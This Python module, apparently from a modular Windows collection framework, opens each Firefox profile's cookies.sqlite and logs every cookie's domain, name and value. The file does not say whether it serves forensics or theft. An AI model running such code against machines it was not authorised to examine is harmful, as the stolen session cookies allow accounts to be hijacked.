try:
	import sqlite3
	import os
except ImportError:
	pass

from modules.windows.firefox.firefox_module import FirefoxModule


class WindowsFirefoxCookie(FirefoxModule):
	def __init__(self):
		FirefoxModule.__init__(
			self,
			name='WindowsFirefoxCookie',
			version='0.1.0',
			file=__file__,
			dependencies=['sqlite3', 'os'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			cookie_path = os.path.join(profile, 'cookies.sqlite')
			if os.path.isfile(cookie_path):
				connection = sqlite3.connect(cookie_path)
				cursor = connection.cursor()
				self.cursor_get_and_log(cursor, 'baseDomain,name,value', 'moz_cookies', spe=os.path.split(profile)[1])
		return True

